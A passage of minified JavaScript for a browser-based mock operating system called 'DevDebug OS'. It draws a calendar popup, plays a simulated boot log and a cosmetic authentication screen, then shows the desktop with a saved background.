n=a.getFullYear(),g=a.getMonth();r.textContent=`${a.toLocaleString("default",{month:"long"})} ${n}`,["Su","Mo","Tu","We","Th","Fr","Sa"].forEach(m=>{const f=document.createElement("div");f.className="font-bold text-xs",f.style.color="var(--text-color-dim)",f.textContent=m,t.appendChild(f)});const d=new Date(n,g,1).getDay(),v=new Date(n,g+1,0).getDate();for(let m=0;m<d;m++)t.appendChild(document.createElement("div"));for(let m=1;m<=v;m++){const f=document.createElement("div");f.className="p-1 rounded-full calendar-day cursor-default",f.textContent=m,m===new Date().getDate()&&g===new Date().getMonth()&&n===new Date().getFullYear()&&f.classList.add("today"),t.appendChild(f)}}o.addEventListener("click",a=>{a.stopPropagation(),e.classList.toggle("hidden"),e.classList.contains("hidden")||(u(p),lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")}))}),document.addEventListener("click",a=>{!e.classList.contains("hidden")&&!e.contains(a.target)&&!o.contains(a.target)&&e.classList.add("hidden")}),s.addEventListener("click",()=>{p.setMonth(p.getMonth()-1),u(p)}),i.addEventListener("click",()=>{p.setMonth(p.getMonth()+1),u(p)})}function Re(){const e=document.getElementById("auth-screen"),o=document.getElementById("auth-btn"),r=document.getElementById("desktop"),t=document.getElementById("taskbar"),s=document.getElementById("click-sound"),i=document.getElementById("hover-sound");i&&o.addEventListener("mouseenter",()=>{i.currentTime=0,i.play().catch(p=>{})}),o.addEventListener("click",()=>{s&&(s.currentTime=0,s.play().catch(p=>{})),o.disabled=!0,o.innerHTML=`
                  <div class="flex items-center justify-center">
                      <span class="m-2">AUTHENTICATING</span>
                      <i data-lucide="loader-pinwheel" class="w-5 h-5 animate-spin mr-2"></i> 
                  </div>
              `,lucide.createIcons({nodes:[o.querySelector("i")]}),setTimeout(()=>{e.style.transition=`opacity ${j.FADE_DURATION}ms ease-out`,e.style.opacity="0";const p=document.getElementById("background-music");p&&p.play().catch(a=>{console.error("Music autoplay failed:",a)}),r.classList.remove("hidden"),t.classList.remove("hidden");const u=localStorage.getItem("desktopBackground");if(u&&u!=="none"&&u!=="solid")document.body.style.backgroundImage=`url('assets/BG/${u}')`,document.body.style.backgroundSize="cover",document.body.style.backgroundPosition="center",document.body.style.backgroundRepeat="no-repeat";else if(u==="solid"){const a=localStorage.getItem("desktopBackgroundColor");a&&(document.body.style.backgroundColor=a,document.body.style.backgroundImage="none")}setTimeout(()=>e.remove(),j.FADE_DURATION)},j.AUTH_DELAY)})}function Oe(){const e=document.getElementById("boot-screen"),o=document.getElementById("boot-logo"),r=document.getElementById("boot-text"),t=document.getElementById("boot-progress"),s=document.getElementById("boot-percent"),i=document.getElementById("boot-status"),p=document.getElementById("auth-screen"),u=`

    
     ____          ____      _              _____ _____ 
    |    \\ ___ _ _|    \\ ___| |_ _ _ ___   |     |   __|
    |  |  | -_| | |  |  | -_| . | | | . |  |  |  |__   |
    |____/|___|\\_/|____/|___|___|___|_  |  |_____|_____|
                                    |___|               
    ________________________________________________________
    
    
    `;o.textContent=u;const a=[{text:"Initializing DEVDEBUG Kernel v5.4.0...",delay:20},{text:"Loading system core modules...",delay:20},{text:"Mounting root file system (Read-Only)...[ OK ]",color:"var(--primary-color)"},{text:"Verifying integrity of system files...",delay:40},{text:" [SUCCESS] Integrity check passed (Checksum: 0x8F3A2)",color:"var(--primary-color)"},{text:"Initializing hardware drivers:",delay:10},{text:"  > GPU: NVIDIA GeForce RTX Simulated Edition...[ OK ]",color:"#aaa"},{text:"  > CPU: Quantum Core x86_64 Emulator...[ OK ]",color:"#aaa"},{text:"  > RAM: 32768KB Allocated...[ OK ]",color:"#aaa"},{text:"Detected input devices: [ Keyboard ], [ Mouse ], [ NeuralLink ]",delay:30},{text:"Starting Network Manager...",delay:50},{text:"  > IP Address assigned: 192.168.0.105",color:"#aaa"},{text:"  > Gateway reachable.",color:"#aaa"},{text:"Starting Window Manager environment...",delay:40},{text:"Loading assets and configurations...",delay:60},{text:"Security hardening in progress...",delay:30},{text:" [WARN] Unofficial plugin detected in /usr/local/addons",color:"var(--danger-color)"},{text:"Bypassing security warnings...[ OVERRIDE ]",color:"var(--accent-color)"},{text:"Establishing secure tunnel to mainframe...",delay:100},{text:"System services started.",delay:20},{text:"Handing over control to user session...",delay:500},{text:"Welcome to DevDebug OS",color:"var(--accent-color)",delay:100}];let n=0,g=0;const c=()=>{const f=Math.min(100,Math.floor((n+1)/a.length*100));g<f&&(g+=Math.random()*2+.5,g>f&&(g=f)),t.style.width=`${g}%`,s.textContent=`${Math.floor(g)}%`,g<100&&requestAnimationFrame(c)};requestAnimationFrame(c);function d(f,h){const l=document.createElement("div");l.style.opacity="0.9",f.color?l.style.color=f.color:l.style.color="var(--text-color-dim)",r.appendChild(l);const k=f.text;let b=0;const x=5;function y(){b<k.length?(l.textContent+=k.charAt(b),b++,setTimeout(y,x+Math.random()*5)):setTimeout(h,f.delay||50)}y()}function v(){n<a.length?d(a[n],()=>{n++,v()}):m()}function m(){t.style.width="100%",s.textContent="100%",i.textContent="SYSTEM READY",i.style.color="var(--accent-color)",setTimeout(()=>{e.style.transition=`opacity ${j.FADE_DURATION}ms ease-out, transform 0.5s ease-in`,e.style.opacity="0",e.style.transform="scale(1.05)",p.classList.remove("hidden"),setTimeout(()=>{p.style.opacity="1",e.remove(),Re()},j.FADE_DURATION)},800)}v()}window.onload=()=>{window.osStartTime=new Date,Pe(),lucide.createIcons(),He(),Be(),$e(),Ne(),Oe();const e=document.getElementById("hover-sound");e&&(e.volume=z.DEFAULT_SFX_VOLUME),document.querySelectorAll(".desktop-icon").forEach(r=>{De(r),e&&r.addEventListener("mouseenter",()=>{e.currentTime=0,e.play().catch(t=>{})})}),_e()};const Fe=W;W=e=>{Fe(e),Q()};const We=V;V=e=>{We(e),Q()};
